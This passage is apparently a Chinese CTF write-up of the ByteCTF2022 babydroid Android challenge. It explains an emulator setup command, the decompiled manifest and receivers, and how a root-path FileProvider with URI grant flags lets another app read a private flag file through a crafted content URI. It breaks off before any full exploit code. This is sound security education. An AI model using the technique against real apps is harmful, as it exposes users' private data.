title="模拟器环境搭建"></a>模拟器环境搭建</h2><p>可以先看后面的分析再来搭环境</p><p>manifest文件将Flagreceiver设置为exported为false和设置了intent-filter，防止外界app进行干扰</p><p>如何将flag传递给FlagReceiver？</p><p>有root就行</p><p>参考博客：[<a href="https://bbs.kanxue.com/thread-275379-1.htm#msg_header_h1_2">原创]ByteCTF2022 mobile系列-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am broadcast -W -a &quot;com.wuhengctf.SET_FLAG&quot; -n &quot;com.bytectf.babydroid/.FlagReceiver&quot; -e &#x27;flag&#x27; &#x27;flag&#123;eeeeeeee&#125;&#x27;</span><br></pre></td></tr></table></figure><p>我们可以用Android Studio的模拟器，选择Android 11</p><table><thead><tr><th>Android 版本</th><th>API</th><th>代号</th></tr></thead><tbody><tr><td>Android 15&#x2F;16 (Preview)</td><td>36</td><td>（内部名）</td></tr><tr><td>Android 14</td><td>34 &#x2F; 35</td><td><strong>UpsideDownCake</strong></td></tr><tr><td>Android 13</td><td>33</td><td><strong>Tiramisu</strong></td></tr><tr><td>Android 12L</td><td>32</td><td>Snow Cone v2</td></tr><tr><td>Android 12</td><td>31</td><td>Snow Cone</td></tr><tr><td>Android 11</td><td>30</td><td>Red Velvet Cake</td></tr><tr><td>Android 10</td><td>29</td><td>Q</td></tr><tr><td>Android 9</td><td>28</td><td>Pie</td></tr><tr><td><strong>Android 8.1</strong></td><td><strong>27</strong></td><td><strong>Oreo</strong></td></tr><tr><td>Android 8.0</td><td>26</td><td>Oreo</td></tr><tr><td>Android 7.x</td><td>24–25</td><td>Nougat</td></tr><tr><td>Android 6.0</td><td>23</td><td>Marshmallow</td></tr><tr><td>Android 5.x</td><td>21–22</td><td>Lollipop</td></tr><tr><td>Android 4.4</td><td>19</td><td>KitKat</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.bytectf.babydroid/.MainActivity</span><br></pre></td></tr></table></figure><p>启动安装的app</p><img src="C:\Users\Matriy\AppData\Roaming\Typora\typora-user-images\image-20260120171509288.png" alt="image-20260120171509288" style="zoom:50%;" /><p>广播完可以看到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120191621596.png" alt="image-20260120191621596"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120193527555.png" alt="image-20260120193527555"></p><h2 id="APP分析"><a href="#APP分析" class="headerlink" title="APP分析"></a>APP分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.babydroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Babydroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.TEST&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.babydroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;action android:name=&quot;com.bytectf.TEST&quot;/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>任何 App 都可以用 action <code>com.bytectf.TEST</code> 启动 Vulnerable</p></blockquote><p><code>receiver</code> 对应的是 Android 的 <strong>BroadcastReceiver 组件</strong>。</p><p>在系统层面：</p><blockquote><p><strong>BroadcastReceiver 是一种“被动组件”</strong></p><p>它不会自己运行，只会在<strong>收到匹配的广播 Intent 时被唤醒</strong></p></blockquote><p><code>intent-filter</code> 是一个 <strong>匹配规则</strong>，告诉 Android哪些 Intent 能匹配到我这个组件</p><blockquote><p><strong>Intent 是 Android 里请求做一件事的消息对象。</strong>一个我想干什么的声明，由系统帮你找谁来干</p></blockquote><p>Android 为什么需要 Intent？因为 Android 有一个<strong>根本设计目标</strong>：</p><blockquote><p><strong>App 之间不能直接互相调用代码（沙箱隔离）。</strong></p></blockquote><p>当一个 Intent 被发出时，系统会做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for 每一个已注册组件:</span><br><span class="line">    if intent-filter 能匹配 Intent:</span><br><span class="line">        加入候选列表</span><br></pre></td></tr></table></figure><table><thead><tr><th>Intent 字段</th><th>intent-filter 中是否声明</th><th>是否必须</th></tr></thead><tbody><tr><td>action</td><td>必须匹配</td><td>必须</td></tr><tr><td>category</td><td>Intent 里的每个都要被 filter 包含</td><td>有则必须</td></tr><tr><td>data</td><td>scheme&#x2F;host&#x2F;path 匹配</td><td>有则必须</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:exported=&quot;false&quot;</span><br></pre></td></tr></table></figure><p>这告诉系统：只有同一个 App 或系统进程，才能用这个 Intent 命中</p><p>这里可能有点懵，先看后面</p><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥</p><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>这段代码 <strong>不会自己运行</strong>，只会在 <strong>Android 系统调用它时</strong>运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有人 sendBroadcast(Intent)</span><br><span class="line">↓</span><br><span class="line">Intent 的 action 命中 FlagReceiver 的 intent-filter</span><br><span class="line">↓</span><br><span class="line">系统调用 onReceive()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.babydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getFilesDir() 在 Android 上，必然返回：</span><br><span class="line">/data/data/&lt;应用包名&gt;/files</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><p>肯定会写到这个路径</p><h3 id="FileProvider"><a href="#FileProvider" class="headerlink" title="FileProvider"></a><strong>FileProvider</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider android:name=&quot;androidx.core.content.FileProvider&quot; android:exported=&quot;false&quot; android:authorities=&quot;androidx.core.content.FileProvider&quot; android:grantUriPermissions=&quot;true&quot;&gt;</span><br><span class="line">    &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot;/&gt;</span><br><span class="line">&lt;/provider&gt;</span><br></pre></td></tr></table></figure><p><code>FileProvider</code> 是 Android 官方提供的“安全文件中转器”，用来把 App 私有文件，安全地以 <code>content://</code> 形式分享给别人。</p><p>早期 Android，App 想把文件给别的 App，只能用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>FileProvider 的设计目的</p><blockquote><p><strong>不暴露真实路径，只给一个“受控的虚拟 URI”。</strong></p></blockquote><p>所以 FileProvider 做了三件事：</p><ol><li>把私有文件映射成 <code>content://</code> URI</li><li>控制 <strong>哪些路径可以被映射</strong></li><li>控制 <strong>哪些 App 可以临时访问</strong></li></ol><p>exported&#x3D;false 外部 App 不能直接访问这个 provider，不能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">    android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot;</span><br><span class="line">    android:resource=&quot;@xml/file_paths&quot;/&gt;</span><br></pre></td></tr></table></figure><p>xml&#x2F;file_paths有路径</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115224738520.png" alt="image-20260115224738520"></p><table><thead><tr><th>子节点</th><th>含义</th></tr></thead><tbody><tr><td><strong>root-path</strong></td><td>代表设备的根目录 &#x2F;</td></tr><tr><td><strong>files-path</strong></td><td>代表 APP 内部存储空间私有目录下的files 目录，等同于 Context.getFilesDir()所获取的目录路径</td></tr><tr><td><strong>cache-path</strong></td><td>代表内部存储的 cache 目录，与 Context.getCacheDir()获取的路径对应</td></tr><tr><td><strong>external-path</strong></td><td>代表外部存储 (sdcard) 的根目录，与 Environment.getExternalStorageDirectory() 获取的路径对应。</td></tr><tr><td><strong>external-files-path</strong></td><td>代表外部存储空间 APP 私有目录下的 files目录，与Context.getExternalFilesDir(null)获取的路径对应</td></tr><tr><td><strong>external-cache-path</strong></td><td>外部存储空间 APP 私有目录下的 cache目录，等同于Context.getExternalCacheDir()</td></tr><tr><td><strong>external-media-path</strong></td><td>代表app 外部存储媒体区域的根目录，与Context.getExternalMediaDirs()获取的路径对应</td></tr></tbody></table><p>意思是：只允许分享 <code>getFilesDir()</code> 目录下的文件</p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115223803430.png" alt="image-20260115223803430" style="zoom:50%;" /><p><code>/data/data/.../files/flag</code>： <strong>保险箱里真正的文件</strong></p><p>FileProvider：<strong>可以临时发一张“取件码&#x2F;通行证”给别人</strong></p><p>别人凭这个码（<code>content://...</code>）去拿你允许的那份文件</p><table><thead><tr><th><strong>android:name</strong></th><th>Android 提供的 FileProvider的实现类</th></tr></thead><tbody><tr><td><strong>android:exported</strong></td><td>建议指定为 **<code>false</code>**，表示该 FileProvider 只能本应用使用，不是 <code>public</code>的</td></tr><tr><td><strong>android:authorities</strong></td><td>相当于一个用于认证的暗号，在分享文件生成 Uri 时，会通过它的值生成对应的 Uri，该值是一个域名，一般格式为 packagename.fileprovider</td></tr><tr><td><strong>android:grantUriPermissions</strong></td><td>值为**<code>true</code>**，表示允许赋予临时权限，即设置为共享</td></tr><tr><td><strong>meta-data</strong></td><td>指定配置共享目录的配置文件</td></tr></tbody></table><blockquote><p>来自LLeaves</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Intent 本身不能绕过权限，但携带了 URI 授权的 Intent可以把对某一个具体文件&#x2F;数据的访问权临时转交给别人</p><p>Intent 是如何提供对内容提供程序的间接访问的?</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://com.xxx.provider/images/123</span><br></pre></td></tr></table></figure><p>这是一个具体到单条资源的 URI</p><p>拥有权限的 App 构造 Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setData(uri);</span><br><span class="line">i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:grantUriPermission=&quot;true&quot;&gt;</span><br></pre></td></tr></table></figure><p>意思是：可以通过 Intent 临时把某个 URI 的访问权授予别人</p><p>如果（且仅如果）被攻击 App 主动通过 Intent 把某个 <code>content://</code> URI 发给攻击者，并且在这个 Intent 上授予了 URI 权限（FLAG_GRANT_*），<br>同时 Provider 允许 URI 授权（grantUriPermissions&#x3D;true），且 file_paths.xml 允许映射到该文件，那么攻击者就可以“临时”读取这个具体文件。</p><p>好，总结完后我们可以最终利用漏洞</p><p>因为file provider设置为非导出，也就意味着外部无法访问。当需要进行文件共享的时候，需要在Intent中加入下面这些中Grant相关的flags <strong>,在这里使用前两个就可以</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_READ_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000001</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_WRITE_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000002</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_GRANT_PREFIX_URI_PERMISSION</span> <span class="operator">=</span> <span class="number">0x00000080</span>;</span><br></pre></td></tr></table></figure><ul><li><p>FLAG_GRANT_READ_URI_PERMISSION：允许接收者读取 URI 的内容，即读取 URI 的数据，并在权限授予期间保持该权限。</p></li><li><p>FLAG_GRANT_WRITE_URI_PERMISSION：允许接收者写入 URI 的内容，即修改 URI 的数据，并在权限授予期间保持该权限。</p></li><li><p>FLAG_GRANT_PERSISTABLE_URI_PERMISSION：与LAG_GRANT_READ_URI_PERMISSION&#96;或 FLAG_GRANT_WRITE_URI_PERMISSION一起使用，表示允许接收者在授予许可后持久保存该权限。这意味着即使应用程序被关闭，权限也会保持有效，并且对 URI 的访问仍然是允许的。</p></li><li><p>FLAG_GRANT_PREFIX_URI_PERMISSION：允许接收者读取或写入指定 URI 的所有后代 URI，而不必单独为每个 URI 授予权限。</p></li></ul><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    android:exported=&quot;false&quot;&gt;</span><br></pre></td></tr></table></figure><p>意思是：</p><blockquote><p><strong>外部 App 不能直接通过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/...</span><br></pre></td></tr></table></figure><p><strong>来访问这个 Provider</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().openInputStream(</span><br><span class="line">    Uri.parse(&quot;content://androidx.core.content.FileProvider/xxx&quot;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这样会被直接拒绝</p></blockquote><p>但是Android 允许一种<strong>例外机制</strong>：</p><blockquote><p><strong>“Provider 自己通过 Intent，把某个 URI 的访问权临时交给别人”</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">是否 exported=true ?</span><br><span class="line">    是 → 允许（再看权限）</span><br><span class="line">    否 → 看有没有 URI permission</span><br><span class="line">              有 → 允许</span><br><span class="line">              没有 → 拒绝</span><br><span class="line">FLAG_GRANT_*</span><br><span class="line">显式“破例放行某一个 URI</span><br></pre></td></tr></table></figure><p>获得权限之后是构造URI去获得flag</p><p>真实文件路径是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><p>FileProvider 的 URI 是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://&lt;authority&gt;/&lt;virtual-path&gt;/&lt;relative-path&gt;</span><br></pre></td></tr></table></figure><p>它完全由 <code>file_paths.xml</code> 决定。</p><p>因为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;paths&gt;</span><br><span class="line">    &lt;root-path name=&quot;root&quot; path=&quot;.&quot;/&gt;</span><br><span class="line">&lt;/paths&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>XML</th><th>含义</th></tr></thead><tbody><tr><td>name&#x3D;”root”</td><td>URI 中的第一段路径</td></tr><tr><td>path&#x3D;”.”</td><td>映射到真实文件系统的根</td></tr></tbody></table><p>于是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://authority/root/data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>才会 <strong>映射到</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/xxx/files/flag</span><br></pre></td></tr></table></figure><p>因此有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure><blockquote><p>不是硬规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">    android:name=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    android:authorities=&quot;androidx.core.content.FileProvider&quot;</span><br><span class="line">    ... 